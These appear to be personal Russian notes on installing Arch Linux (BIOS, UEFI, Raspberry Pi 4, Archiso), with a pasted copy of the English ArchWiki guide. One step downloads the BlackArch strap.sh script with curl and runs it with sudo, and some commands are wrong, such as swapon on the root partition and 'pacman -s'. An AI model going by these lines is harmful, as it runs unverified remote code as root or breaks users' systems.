Чтобы это сделать, найдите в списке сервер от Яндекса и поставьте на эту строку курсор. Нажмите сочетание клавиш Ctrl+K чтобы вырезать строчку. Теперь переместите курсор в самый верх файла и нажмите сочетание Ctrl+U, чтобы вставить строчку.

Сохраните изменения в файле и закройте редактор. Для этого нажмите Ctrl+X, нажмите y, а затем Enter.


Установка основных пакетов системы

Подготовительная часть окончена. Теперь можно выполнить установку основных пакетов base, для этого выполните команду:

# pacstrap /mnt base base-devel

Процесс установки пакетов займет некоторое время.

У меня во время установки пакетов промелькнула вот такая ошибка: [ 1859.596408] systemd-tmpfiles[4216]: Failed to create file /sys/devices/system/cpu/microcode/reload: Read-only filesystem, но она никак не повлияла на дальнейшую установку. Поэтому я ее просто проигнорировал.

Генерация файла fstab

Сгенерируем файл fstab:

# genfstab -L /mnt >> /mnt/etc/fstab

Просмотреть содержимое файла можно командой:

# cat /mnt/etc/fstab



Изменение корневого каталога

Воспользуемся скриптом arch-chroot, чтобы сменить корневой каталог. Мы переключимся на каталог /mnt, в который у нас примонтирован корневой раздел диска.

# arch-chroot /mnt

Часовой пояс

Настроим часовой пояс:

# ln -sf /usr/share/zoneinfo/Europe/Moscow /etc/localtime

Выполним hwclock, чтобы сгенерировать файл /etc/adjtime, в котором хранятся соответсвующие настройки.

# hwclock --systohc


Локализация

Язык, который использует система, определяется локалью. Помимо языка интерфейса локаль определяет и форматы чисел, времени, даты и некоторые другие региональные особенности.

Для поддержки русского и/или других языков необходимо раскомментировать соответствующие строки (локали) в файле /etc/locale.gen. Откройте файл для редактирования:

# nano /etc/locale.gen

Я раскомментировал строки:

 en_US.UTF-8 UTF-8 
 ru_RU.UTF-8 UTF-8

Сохраните изменения и закройте файл.

Теперь генерируем локали. Для этого выполняем команду:

# locale-gen

Установим переменную LANG в файле /etc/locale.conf. Создадим файл /etc/locale.conf(используем редактор nano):

# nano /etc/locale.conf

Введите текст:

 LANG=ru_RU.UTF-8

Сохраните и закройте файл.

Также добавим русскую раскладку клавиатуры для консоли и шрифт с поддержкой кириллицы:

# nano /etc/vconsole.conf

Введите строки:

 KEYMAP=ru 
 FONT=cyr-sun16

Сохраните и закройте файл.


Настройка hostname и hosts

Создадим файл hostname, в котором введем имя компьютера.

# nano /etc/hostname

Вводим имя компьютера, например:

xxx

Сохраните и закройте файл.

Отредактируем файл /etc/hosts.

# nano /etc/hosts

Содержимое файла должно иметь вид (вместо xxx укажите ваш hostname):

 127.0.0.1 localhost 
 ::1 
localhost 
 127.0.0.1 xxx.localdomain xxx

Если у системы постоянный IP-адрес, то вместо 127.0.0.1 укажите этот адрес.


Пароль суперпользователя

Установим пароль суперпользователя (пароль пользователя root). Выполняем команду:

# passwd

Вводим пароль и подтверждение пароля.



Установка загрузчика GRUB

Примечание. Если вы устанавливаете ArchLinux рядом с другим дистрибутивом Linux, и у вас уже установлен GRUB, то вы можете его использовать, а не устанавливать еще один GRUB на другой раздел. В таком случае вам нужно примонтировать раздел, на котором уже установлен GRUB, выполнить chroot на данный раздел и запустить update-grub.

Приведу последовательность команд, которую я использовал:

mkdir /mnt2 - создаем директорию, в которую будем монтировать раздел, на котором уже установлен GRUB. mount /dev/sda5 /mnt2 - монтируем раздел. cd /mnt2 - Входим в директорию. ls - Проверяем, то ли мы примонтировали. arch-chroot /mnt2 - Делаем chroot на /mnt2 sudo update-grub exit cd ..

Если же вам нужно установить и настроить GRUB, то следуйте указаниям ниже.

Установим загрузчик GRUB.

Сначала установим пакет grub, для этого выполняем команду:

# pacman -S grub

Если вы используете или планируете использовать на этом компьютере не только ОС Linux, но и другие операционные системы, например, Windows, то установите пакет os-prober:

# pacman -s os-prober

Теперь инсталлируем grub:

# grub-install /dev/sda

Обратите внимание на то, что в команде мы указываем устройство (/dev/sda), а не раздел. Загрузчик устанавливается в каталог /boot.
Если команда выполнится без ошибок, то вы получите сообщение вида: Installation finished. No error reported.

Запускаем автоматическую настройку grub:

# grub-mkconfig -o /boot/grub/grub.cfg

У меня в процессе выполнения данной команды выскочило предупреждение: WARNING: failed to connect to lvmetad: No such file or directory. Falling back to internal scanning. В руководстве по ArchLinux сказано, что это нормально и данное сообщение можно проигнорировать.



Перезагрузка компьютера

Выйдите из окружения chroot, выполнив команду:

# exit

Перезагрузите компьютер, выполнив:

# reboot

Не забудьте извлечь Live-носитель, чтобы опять случайно не загрузиться в Live-систему.



Создание пользователя

Сейчас вы работаете от имени пользователя root. Создадим обычного пользователя, от имени которого вы и будете пользоваться системой. Я создал пользователя xxx (вместо xxx укажите имя вашего пользователя).

# useradd -m -g users -G wheel -s /bin/bash xxx

Теперь в директории /home появится домашняя директория пользователя. Ее можно посмотреть командой ls:

# ls /home xxx

Зададим пароль для только что созданного пользователя:

# passwd xxx



Настройка интернет

У меня используется проводное Ethernet соединение. IP адрес система получает автоматически. Поэтому необходимо включить сервис DHCP. Выполняем команды:

# systemctl enable dhcpcd.service
# systemctl start dhcpcd.service

Ждем несколько секунд пока система получит IP-адрес. Можно проверить соединение, выполнив ping:

# ping -c 5 archlinux.orgУстановка sudo

Установим sudo и позволим нашему пользователю использовать sudo.

Для установки sudo выполните команду:

# pacman -S sudo

Теперь разрешим пользователям группы wheelиспользование sudo. Когда мы создавали пользователя, то мы добавили его в группу wheel, поэтому он сможет пользоваться sudo. Выполняем команду:

# visudo

Откроется редактор Vi с файлом настроек sudo.

Найдите строку «# %wheel ALL=(ALL) ALL» (перемещайте курсор вниз клавишей Стрелка Вниз. Строка закомментирована (перед ней стоит символ решетки #).


Нам нужно раскомментировать ее (то есть удалить символ решетки). Поместите курсор на символ решетки и нажмите клавишу x. Также можно удалить пробел, который стоял после решетки.

Теперь нужно сохранить изменения и закрыть редактор. Для этого нажмите двоеточие «:», в нижней части экрана появится строка для ввода символов. Введите wq и нажмите Enter. Если вдруг вы не хотите сохранять изменения, а хотите просто закрыть редактор, то вместо wq введите q!.



Установка Иксов

Прежде всего установим «иксы» — Xorg.Выполняем команду:

# pacman -S xorg

Вас спросят, устанавливать ли все пакеты, я устанавливал все, просто нажмите Enter.



Установка экранного менеджера

Экранный менеджер запускается сразу после загрузки системы. В нем вы выбираете пользователя для входа в систему и вводите пароль. Существует несколько разных экранных менеджеров, я устанавливал sddm:

# pacman -S sddm

Разрешим автоматический запуск sddm при загрузке системы:

# systemctl enable sddm.service


Установка KDE

Для установки KDE выполните 
#pacman -S plasma

# reboot

Шрифт в терминале

Если вдруг у вас в терминале ужасный шрифт, то установите пакет ttf-dejavu и перезапустите терминал:

$ sudo pacman -S ttf-dejavu

Обновление системы:

$ sudo pacman -Syyuu


установка репозитория blackarch:

$ sudo pacman -S curl

$ cd ~/Downloads

$ curl -O https://blackarch.org/strap.sh

$ chmod +x strap.sh

$ sudo ./strap.sh


установка aurman:

$ git clone https://aur.archlinux.org/aurman-git.git

$ cd aurman-git

$ makepkg -si


---------------------
 ***
*установка archlinux в режиме UEFI*

Подготовка

Качаем дистр Arch linux Yandex mirror

Заливаем на флешку:
# dd if=archlinux-2018.05.01-x86_64.iso of=/dev/sdb

Загружаем машину с флешки и по шагам:

1. Разбиваем хард на разделы:

# cfdisc /dev/sda

На выходе необходимо получить примерно следующую структуру с указанными типами Ф.С.:


Порядок     Описание    Раздел          Размер      Тип 
1           ESP         /dev/sda1       1Gib        Linux EFI System
2           /           /dev/sda2       340GiB      Linux Filesystem
3           /home       /dev/sda3       340GiB      Linux Filesystem
4           SWAP        /dev/sda4       16GiB       Linux Swap




Примечание: Раздел UEFISYS может быть любого размера, который поддерживается файловой системой FAT32. В соответствии с документацией пресловутой Microsoft, минимальный размер раздела с FAT32 - 512Мб. В соответствии с вышесказанным рекомендуется устанавливать размер UEFISYS раздела больше 512Мб. Мы сделаем его размером в 1Gb Подробнее здесь: ArchWiki UEFI (Русский)

2. Создаем Файловые системы на созданных разделах

UEFI раздел FAT32:

# mkfs.vfat -F32 -n "BOOT_FS" /dev/sda1

Корневой раздел EXT4:

# mkfs.ext4 -L "ROOT_FS" /dev/sda2

Домашний раздел EXT4:

# mkfs.ext4 -L "HOME_FS" /dev/sda3

Раздел подкачки: создаем его :

# mkswap -L "SWAP_FS" /dev/sda4

Подробнее здесь: ArchWiki Partitionig (Русский)

3. Монтируем Файловые системы

Примечание: Мы будем развертывать новую систему в директории /mnt

Монтируем корневой раздел в /mnt

# mount /dev/sda2 /mnt

Создаем директорию /boot и /home для загрузчика и домашнего раздела:

# mkdir /mnt/{boot,home}

Монтируем UEFI раздел

# mount /dev/sda1 /mnt/boot

Монтируем домашний раздел

# mount /dev/sda3 /mnt/home

Монтируем раздел подкачки :

# swapon /dev/sda2

Все вышеописанное можно сделать используя метки которые мы задали при создании файловых систем:



# mount -L ROOT_FS /mnt 

# mkdir /mnt/{boot,home} 

# mount -L BOOT_FS /mnt/boot 

# mount -L HOME_FS /mnt/home 

# swapon -L SWAP_FS


4. Поднимаем сеть WiFi

Выбираем свою точку доступа и подрубаемся к ней <ИМЯ_ИНТЕРФЕЙСА> может быть например таким wlp0s21f0u7i2:

# wifi-menu <ИМЯ_ИНТЕРФЕЙСА>

Проверяем:

# ping ya.ru

Если сети нет, то выясняем имя беспроводного интерфейса:

# ip link

И поднимаем его принудительно:

# ip link set wlp0s21f0u7i2 up

5. Разворачиваем систему из репозитория

В файле /etc/pacman.d/mirrorlist перемещаем адреса российский серверов в самый верх. Ну, или можно сделать как здесь: ArchWiki Mirrors (Русский)

Выполняем скрипт инициализации системы, указав ему :# pacstrap /mnt base base-devel

Для поддержки беспроводной сети на мой взгляд лучше использовать NetworkManager ArchWiki NetworkManager (Русский) т.к он прост в обращении и под него реально найти апплеты для гуевого рабочего стола. Итак укажем установщику дополнительно установить пакеты: networkmanager, dialog, wpa_supplicant:

# pacstrap /mnt networkmanager dialog wpa_supplicant

6. Делаем снимок точек монтирования в файл fstab

"Запечем" правила монтирования файловых систем в файл:

# genfstab -U /mnt >> /mnt/etc/fstab

Далее переходим в оболочку новой системы:

# arch-chroot /mnt

И обновляем данные пакетного менеджера и установленные утилиты:

# pacman -Suy

7. Устанавливаем UEFI менеджер загрузки

Установим systemd-boot - UEFI менеджер загрузки при помощи утилиты bootctl:

# bootctl install

8. Создадим загрузочную запись для UEFI менеджера загрузки

Необходимо поправить файл загрузчика: /boot/loader/loader.conf что бы он принял следующий вид:

timeout 4 default arch

где timeout 4 это время задержки, а default arch указывает загрузить систему основываясь на записи в файле /boot/loader/entries/arch.conf.
Его содержание:

title   Arch Linux
linux   /vmlinuz-linux
initrd  /intel-ucode.img
initrd  /initramfs-linux.img
options root=LABEL=/dev/sda3 rw

Кстати этот файл в арче копируется с шаблона:

# cp /usr/share/systemd/bootctl/arch.conf /boot/loader/entries

После можно проверить что наша запись с ArchLinux появилась:

# bootctl list

Необходимо так же на случай обновления systemd разместить следующий pacman hook в каталоге /etc/pacman.d/hooks/:

# nano /etc/pacman.d/hooks/systemd-boot.hook 


[Trigger]
Type = Package
Operation = Upgrade
Target = systemd

[Action]
Description = Updating systemd-boot...
When = PostTransaction
Exec = /usr/bin/bootctl update

Подробнее про описанное выше здесь: ArchWiki systemd-boot (Русский)

9. Завершение установки

Теперь можно задать пароль для рута

# passwd

создать дополнительных пользователей и пр.

# useradd -m -g users -G audio,video,games,disk,storage,network,power,lp,wheel <ИМЯ_ПОЛЬЗОВАТЕЛЯ> # passwd <ИМЯ_ПОЛЬЗОВАТЕЛЯ>

После этого выходим из окружения и перезагружаем систему

# exit 

# reboot

Вытаскиваем флешку, меняем устройство загрузки и грузим новую систему.



-----------------

Вот алгоритм для EFI

Создать раздел с типом EFI System с помощью cfdisk объемом 100Мб.
Отформатировать его как FAT32 
root@archiso ~ # mkfs.fat -F32 /dev/sda1

Порядок монтирования важен.
root@archiso ~ # mount /dev/sda2 /mnt
root@archiso ~ # mkdir /mnt/boot
root@archiso ~ # mount /dev/sda1 /mnt/boot

Ставим систему
root@archiso ~ # pacstrap /mnt base

Генерируем таблицу разделов
root@archiso ~ # genfstab -p /mnt >> /mnt/etc/fstab

Заходим в неё
root@archiso ~ # arch-chroot /mnt /bin/bash

[root@archiso /]# pacman -S grub efibootmgr
[root@archiso /]# grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub
[root@archiso /]# grub-mkconfig -o /boot/grub/grub.cfg
[root@archiso /]# exit

root@archiso ~ # umount /dev/sda1
root@archiso ~ # umount /dev/sda2

root@archiso ~ # reboot



-------------------------------------------------

View this installation guide online at
https://wiki.archlinux.org/index.php/Installation_Guide


   This document is a guide for installing Arch Linux from the live system
   booted with the official installation image. Before installing, it
   would be advised to view the FAQ. For conventions used in this
   document, see Help:Reading. In particular, code examples may contain
   placeholders (formatted in italics) that must be replaced manually.

   For more detailed instructions, see the respective ArchWiki articles or
   the various programs' man pages, both linked from this guide. For
   interactive help, the IRC channel and the forums are also available.

   Arch Linux should run on any x86_64-compatible machine with a minimum
   of 512 MiB RAM. A basic installation with all packages from the base
   group should take less than 800 MiB of disk space. As the installation
   process needs to retrieve packages from a remote repository, this guide
   assumes a working internet connection is available.
   [ ]

Contents

     * 1 Pre-installation
          + 1.1 Verify signature
          + 1.2 Boot the live environment
          + 1.3 Set the keyboard layout
          + 1.4 Verify the boot mode
          + 1.5 Connect to the internet
          + 1.6 Update the system clock
          + 1.7 Partition the disks
               o 1.7.1 Example layouts
          + 1.8 Format the partitions
          + 1.9 Mount the file systems
     * 2 Installation
          + 2.1 Select the mirrors
          + 2.2 Install the base packages
     * 3 Configure the system
          + 3.1 Fstab
          + 3.2 Chroot
          + 3.3 Time zone
          + 3.4 Localization
          + 3.5 Network configuration
          + 3.6 Initramfs
          + 3.7 Root password
          + 3.8 Boot loader
     * 4 Reboot
     * 5 Post-installation

Pre-installation

   The installation media and their GnuPG signatures can be acquired from
   the Download page.

Verify signature

   It is recommended to verify the image signature before use, especially
   when downloading from an HTTP mirror, where downloads are generally
   prone to be intercepted to serve malicious images.

   On a system with GnuPG installed, do this by downloading the PGP
   signature (under Checksums) to the ISO directory, and verifying it
   with:
$ gpg --keyserver-options auto-key-retrieve --verify archlinux-version-x86_64.is
o.sig

   Alternatively, from an existing Arch Linux installation run:
$ pacman-key -v archlinux-version-x86_64.iso.sig

   Note:
     * The signature itself could be manipulated if it is downloaded from
       a mirror site, instead of from archlinux.org as above. In this
       case, ensure that the public key, which is used to decode the
       signature, is signed by another, trustworthy key. The gpg command
       will output the fingerprint of the public key.
     * Another method to verify the authenticity of the signature is to
       ensure that the public key's fingerprint is identical to the key
       fingerprint of the Arch Linux developer who signed the ISO-file.
       See Wikipedia:Public-key cryptography for more information on the
       public-key process to authenticate keys.

Boot the live environment

   The live environment can be booted from a USB flash drive, an optical
   disc or a network with PXE. For alternative means of installation, see
   Category:Installation process.
     * Pointing the current boot device to a drive containing the Arch
       installation media is typically achieved by pressing a key during
       the POST phase, as indicated on the splash screen. Refer to your
       motherboard's manual for details.
     * When the Arch menu appears, select Boot Arch Linux and press Enter
       to enter the installation environment.
     * See README.bootparams for a list of boot parameters, and
       packages.x86_64 for a list of included packages.
     * You will be logged in on the first virtual console as the root
       user, and presented with a Zsh shell prompt.

   To switch to a different console--for example, to view this guide with
   ELinks alongside the installation--use the Alt+arrow shortcut. To edit
   configuration files, nano, vi and vim are available.

Set the keyboard layout

   The default console keymap is US. Available layouts can be listed with:
# ls /usr/share/kbd/keymaps/**/*.map.gz

   To modify the layout, append a corresponding file name to loadkeys(1),
   omitting path and file extension. For example, to set a German keyboard
   layout:
# loadkeys de-latin1

   Console fonts are located in /usr/share/kbd/consolefonts/ and can
   likewise be set with setfont(8).

Verify the boot mode

   If UEFI mode is enabled on an UEFI motherboard, Archiso will boot Arch
   Linux accordingly via systemd-boot. To verify this, list the efivars
   directory:
# ls /sys/firmware/efi/efivars

   If the directory does not exist, the system may be booted in BIOS or
   CSM mode. Refer to your motherboard's manual for details.

Connect to the internet

   To set up a network connection, go through the following steps:
    1. Ensure your network interface is listed and enabled, for example
       with ip-link(8):
# ip link
    2. Connect to the network. Plug in the Ethernet cable or connect to
       the wireless LAN.
    3. Configure your network connection:
          + Static IP address
          + Dynamic IP address: use DHCP.

                Note: The installation image enables dhcpcd
                (dhcpcd@interface.service) for wired network devices on
                boot.

    4. The connection may be verified with ping:
# ping archlinux.org

Update the system clock

   Use timedatectl(1) to ensure the system clock is accurate:
# timedatectl set-ntp true

   To check the service status, use timedatectl status.

Partition the disks

   When recognized by the live system, disks are assigned to a block
   device such as /dev/sda or /dev/nvme0n1. To identify these devices, use
   lsblk or fdisk.
# fdisk -l

   Results ending in rom, loop or airoot may be ignored.

   The following partitions are required for a chosen device:
     * One partition for the root directory /.
     * If UEFI is enabled, an EFI system partition.

   If you want to create any stacked block devices for LVM, system
   encryption or RAID, do it now.

Example layouts

   BIOS with MBR
   Mount point Partition Partition type Suggested size
   /mnt /dev/sdX1 Linux Remainder of the device
   [SWAP] /dev/sdX2 Linux swap More than 512 MiB
   UEFI with GPT
   Mount point Partition Partition type Suggested size
   /mnt/boot or /mnt/efi /dev/sdX1 EFI system partition 260-512 MiB
   /mnt /dev/sdX2 Linux x86-64 root (/) Remainder of the device
   [SWAP] /dev/sdX3 Linux swap More than 512 MiB

   See also Partitioning#Example layouts.
   Note:
     * Use fdisk or parted to modify partition tables, for example fdisk
       /dev/sdX.
     * Swap space can be set on a swap file for file systems supporting
       it.

Format the partitions

   Once the partitions have been created, each must be formatted with an
   appropriate file system. For example, if the root partition is on
   /dev/sdX1 and will contain the ext4 file system, run:
# mkfs.ext4 /dev/sdX1

   If you created a partition for swap, initialize it with mkswap:
# mkswap /dev/sdX2
# swapon /dev/sdX2

   See File systems#Create a file system for details.

Mount the file systems

   Mount the file system on the root partition to /mnt, for example:
# mount /dev/sdX1 /mnt

   Create any remaining mount points (such as /mnt/efi) and mount their
   corresponding partitions.

   genfstab will later detect mounted file systems and swap space.

Installation

Select the mirrors

   Packages to be installed must be downloaded from mirror servers, which
   are defined in /etc/pacman.d/mirrorlist. On the live system, all
   mirrors are enabled, and sorted by their synchronization status and
   speed at the time the installation image was created.

   The higher a mirror is placed in the list, the more priority it is
   given when downloading a package. You may want to edit the file
   accordingly, and move the geographically closest mirrors to the top of
   the list, although other criteria should be taken into account.

   This file will later be copied to the new system by pacstrap, so it is
   worth getting right.

Install the base packages

   Use the pacstrap script to install the base package group:
# pacstrap /mnt base

   This group does not include all tools from the live installation, such
   as btrfs-progs or specific wireless firmware; see packages.x86_64 for
   comparison.

   To install packages and other groups such as base-devel, append the
   names to pacstrap (space separated) or to individual pacman commands
   after the #Chroot step.

Configure the system

Fstab

   Generate an fstab file (use -U or -L to define by UUID or labels,
   respectively):
# genfstab -U /mnt >> /mnt/etc/fstab

   Check the resulting file in /mnt/etc/fstab afterwards, and edit it in
   case of errors.

Chroot

   Change root into the new system:
# arch-chroot /mnt

Time zone

   Set the time zone:
# ln -sf /usr/share/zoneinfo/Region/City /etc/localtime

   Run hwclock(8) to generate /etc/adjtime:
# hwclock --systohc

   This command assumes the hardware clock is set to UTC. See System
   time#Time standard for details.

Localization

   Uncomment en_US.UTF-8 UTF-8 and other needed locales in
   /etc/locale.gen, and generate them with:
# locale-gen

   Create the locale.conf(5) file, and set the LANG variable accordingly:
/etc/locale.conf
LANG=en_US.UTF-8

   If you set the keyboard layout, make the changes persistent in
   vconsole.conf(5):
/etc/vconsole.conf
KEYMAP=de-latin1

Network configuration

   Create the hostname file:
/etc/hostname
myhostname

   Add matching entries to hosts(5):
/etc/hosts
127.0.0.1       localhost
::1             localhost
127.0.1.1       myhostname.localdomain  myhostname

   If the system has a permanent IP address, it should be used instead of
   127.0.1.1.

   Complete the network configuration for the newly installed environment.

Initramfs

   Creating a new initramfs is usually not required, because mkinitcpio
   was run on installation of the linux package with pacstrap.

   For LVM, system encryption or RAID, modify mkinitcpio.conf(5) and
   recreate the initramfs image:
# mkinitcpio -p linux

Root password

   Set the root password:
# passwd

Boot loader

   Choose and install a Linux-capable boot loader. If you have an Intel or
   AMD CPU, enable microcode updates in addition.

Reboot

   Exit the chroot environment by typing exit or pressing Ctrl+d.

   Optionally manually unmount all the partitions with umount -R /mnt:
   this allows noticing any "busy" partitions, and finding the cause with
   fuser(1).

   Finally, restart the machine by typing reboot: any partitions still
   mounted will be automatically unmounted by systemd. Remember to remove
   the installation media and then login into the new system with the root
   account.

Post-installation

   See General recommendations for system management directions and
   post-installation tutorials (like setting up a graphical user
   interface, sound or a touchpad).

   For a list of applications that may be of interest, see List of
   applications.



-----------------------------

raspberry pi 4


Установка

Замените sdX в следующих инструкциях именем устройства для SD-карты, как оно отображается на вашем компьютере.

Запустите fdisk для разделения SD-карты

fdisk /dev/sdX


В командной строке fdisk удалите старые разделы и создайте новый:

Тип o . Это позволит очистить все разделы на диске.

Введите p для вывода списка разделов. Там не должно быть никаких разделов слева.

Введите n, затем p для основного, 1 для первого раздела на диске, нажмите ENTER, чтобы принять первый сектор по умолчанию, а затем введите +100M для последнего сектора.

Введите t, затем c, чтобы установить первый раздел для типа W95 FAT32 (LBA).

Введите n, затем p для основного, 2 для второго раздела на диске, а затем дважды нажмите клавишу Ввод, чтобы принять первый и последний сектор по умолчанию.

Напишите таблицу разделов и выйдите, введя w .

Создание и монтирование файловой системы FAT:

mkfs.vfat /dev/sdX1 
mkdir boot 
mount /dev/sdX1 boot


Создание и монтирование файловой системы ext4:

mkfs.ext4 /dev/sdX2 
mkdir root 
mount /dev/sdX2 root


Загрузите и извлеките корневую файловую систему (как корневую, а не через sudo):

wget http://os.archlinuxarm.org/os/ArchLinuxARM-rpi-4-latest.tar.gz bsdtar -xpf ArchLinuxARM-rpi-4-latest.tar.gz -C root sync



Переместить загрузочные файлы на первый раздел:

mv root/boot/* boot


Размонтировать эти два раздела:


umount boot root


Вставьте SD-карту в Raspberry Pi, подключите ethernet и включите питание 5 В.

Используйте последовательную консоль или SSH для IP-адреса, указанного плате вашим маршрутизатором.

Войдите в систему как сигнал тревоги пользователя по умолчанию с сигналом тревоги пароля .

Пароль пользователя root по умолчанию-root.

Инициализируйте связку ключей pacman и заполните ключи подписи пакета Arch Linux ARM:

pacman-key --init
pacman-key --populate archlinuxarm



-------------

Arch Linux ARM реализует подписание пакетов в соответствии с моделью, созданной Arch Linux. Все пакеты во всех репозиториях для всех архитектур подписываются нашей системой сборки; однако файлы базы данных репозитория не подписываются для ограничения доступа к закрытым ключам и потому, что это технически не требуется.

Поскольку все пакеты в наших репозиториях происходят из нашей системы сборки, а не от отдельных разработчиков и сопровождающих, пакеты подписываются одним ключом системы сборки, прежде чем покинуть безопасную среду сборки. Кроме того, Arch Linux ARM зеркала синхронизируются с помощью rsync push от нашего главного сервера, способствуя целостности пакетов, доступных для установки.

Включение Проверки Подписи

Чтобы помочь работе pacman-key, убедитесь, что демон haveged запущен. Этот демон поддерживает полный пул энтропии системы.

systemctl status haveged



Если эта команда сообщает, что он активен и работает, перейдите к следующему шагу. В противном случае установите, запустите и при необходимости включите haveged для запуска при загрузке:

pacman -Syu haveged 
systemctl start haveged
systemctl enable haveged



Инициализируйте брелок pacman:

pacman-key --init



Установите брелок Arch Linux ARM:

pacman -S archlinuxarm-keyring
pacman-key --populate archlinuxarm



Редактировать /etc / pacman.conf и раскомментируйте или добавьте следующие строки:

SigLevel = Required DatabaseOptional LocalFileSigLevel = Optional



Keys

Master Signing KeysKey ID Owner02922214DE8981D14DC2ACABBC704E86B823CD25Kevin Mihelich9D22B7BB678DC056B1F7723CB55C5315DCD9EE1AJason Plum69DD6C8FD314223E14362848BF7EEF7A9C6B5765Mike Brown
Package Signing KeysKey ID Owner68B3537F39A313B3E574D06777193F152BDBE6A6Arch Linux ARM Build System



___________________________________________________________________________________________________________________________________________________________________________________________________________________

Archiso — набор bash скриптов, предназначенных для создания полностью функциональных Live-CD/DVD и Live-USB на базе Arch Linux. Это тот же инструмент, который используется для создания официальных образов, но он довольно гибкий инструмент, который может быть использован как для создания дисков восстановления или установочных, так и для специализированных live-CD/DVD/USB систем. Сердце Archiso — mkarchiso. Для получения подробного описания всех его опций достаточно вызвать его без параметров, так что здесь будет описанно только создание live диска своими руками. 

Установка
Примечание: Рекомендуется действовать с правами суперпользователем во всех последующих шагах. В противном случае возможны проблемы позже с ложными разрешениями.

Прежде чем начать, установите пакет: archiso или archiso-gitAUR.

Archiso поставляется с двумя "профилями": releng и baseline.

    Если вы хотите создать полностью индивидуальную версию Arch Linux, предварительно установленной со всеми вашими любимыми программами и конфигурациями, используйте профиль releng.
    Если вы просто хотите создать основу для live CD, без предварительно установленных пакетов и минимальной конфигурацией, используйте baseline.

Теперь скопируйте профиль на Ваш выбор, в каталог (~/archlive используется в примере ниже), в котором вы можете вносить корректировки. Выполните следующую команду, заменив profile либо на releng, либо на baseline. 


# cp -r /usr/share/archiso/configs/profile/ archlive


    Если вы используете профиль releng для создания полностью индивидуального образа, вы можете переходить к секции #Настройка live носителя: https://wiki.archlinux.org/index.php/Archiso_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)#%D0%9D%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B0_live_%D0%BD%D0%BE%D1%81%D0%B8%D1%82%D0%B5%D0%BB%D1%8F
    
    Если вы используете профиль baseline для создания пустого образа, то вам не нужно его настраивать, поэтому переходите к секции #Сборка ISO: https://wiki.archlinux.org/index.php/Archiso_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)#%D0%A1%D0%B1%D0%BE%D1%80%D0%BA%D0%B0_ISO
    
    
    
Настройка live носителя

В этом разделе подробно описывается настройка создаваемого вами образа, определение пакетов и конфигураций, которые вы хотите, чтобы ваш live образ содержал.

Внутри каталога archlive, созданного в #Установка, имеется ряд файлов и каталогов; мы рассмотрим лишь несколько из них, в основном:

    packages.x86_64 — это где вы перечисляете построчно пакеты, которые вы хотите установить, и
    каталог airootfs — это каталог, действующий как наложение, и именно там вы делаете все настройки.

Как правило, любые административные задачи, которые вы обычно делаете после новой установки, могут быть выполнены в скрипте  archlive/airootfs/root/customize_airootfs.sh , за исключением установки пакетов. Скрипт должен быть написан с точки зрения новой среды, поэтому / в скрипте означает корень ISO-образа, который создается. 
    


Установка пакетов

Отредактируйте списки пакетов в packages.x86_64 чтобы указать, какие пакеты должны быть установлены на live носителе.
Примечание: Если вы хотите использовать оконный менеджер в Live CD, то вы должны добавить необходимые и правильные видео драйвера, или WM может зависнуть при загрузке.



Для подготовки своих пакетов или пакетов из AUR/ABS :  https://wiki.archlinux.org/index.php/AUR_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)  /   https://wiki.archlinux.org/index.php/Arch_Build_System_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)  , вы можете создать собственный локальный репозиторий   :   https://wiki.archlinux.org/index.php/Pacman/Tips_and_tricks_(%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9)#%D0%A1%D0%BE%D0%B1%D1%81%D1%82%D0%B2%D0%B5%D0%BD%D0%BD%D1%8B%D0%B9_%D0%BB%D0%BE%D0%BA%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9_%D1%80%D0%B5%D0%BF%D0%BE%D0%B7%D0%B8%D1%82%D0%BE%D1%80%D0%B8%D0%B9 . Если вам нужна поддержка нескольких архитектур, примените соответствующие меры для предотвращения ошибок в будущем. Каждая архитектура должна иметь собственное дерево каталогов: 


$ tree ~/customrepo/ | sed "s/$(uname -m)/<arch>/g"

/home/archie/customrepo/
└── <arch>
    ├── customrepo.db -> customrepo.db.tar.xz
    ├── customrepo.db.tar.xz
    ├── customrepo.files -> customrepo.files.tar.xz
    ├── customrepo.files.tar.xz
    └── personal-website-git-b99cce0-1-<arch>.pkg.tar.xz

1 directory, 5 files




Затем вы можете добавить свой репозиторий, поместив следующее в  ~/archlive/pacman.conf  выше других записей (для более высокого приоритета): 


~/archlive/pacman.conf

...
 # Свой (пользовательский) репозиторий
 [customrepo]
 SigLevel = Optional TrustAll
 Server = file:///home/пользователь/customrepo/$arch
...



Если пакет подходит, repo-add выполняет проверку. Иначе, вы столкнетесь с сообщениями об ошибках, подобными этому: 

==> ERROR: '/home/archie/customrepo/<arch>/foo-<arch>.pkg.tar.xz' does not have a valid database archive extension.
    



Предотвращение установки пакетов, принадлежащих основной группе

По умолчанию  /usr/bin/mkarchiso , скрипт, который используется  ~/archlive/build.sh , вызывает один из скриптов  arch-install-scripts  с именем pacstrap без флага -i, что заставляет Pacman не ждать ввода пользователя во время процесса установки.

При внесении в черный список основных пакетов группы путем добавления их в строку IgnorePkg в файле  ~/archlive/pacman.conf , Pacman спрашивает, должны ли они все еще быть установлены, а это значит, что они будут при обходе ввода пользователя. Чтобы избавиться от этих пакетов существует несколько вариантов:

    "Грязный" способ: Добавьте флаг -i в каждую строку, вызывающую pacstrap в  /usr/bin/mkarchiso .

    "Чистый": Создайте копию  /usr/bin/mkarchiso , в которую вы добавите флаг и адаптируете  ~/archlive/build.sh , так чтобы он вызывал измененную версию скрипта  mkarchiso.

    Расширенный способ: Создайте функцию для  ~/archlive/build.sh , которая явно удаляет пакеты после основной установки. Это принесет вам удовольствие от того, что вам не придется много вводить во время процесса установки.

Установка пакетов из multilib

Чтобы установить пакеты из репозитория  multilib , вам нужно просто раскомментировать его в  ~/archlive/pacman.conf : 
    

pacman.conf

[multilib]
SigLevel = PackageRequired
Include = /etc/pacman.d/mirrorlist



Добавление файлов в образ
Примечание: Для этого вы должны быть суперпользователем, не изменяйте владельца для какого-либо скопированного вами файла, все в каталоге airootfs должно принадлежать суперпользователю. Правильные владельцы будут установлены в ближайшее время.


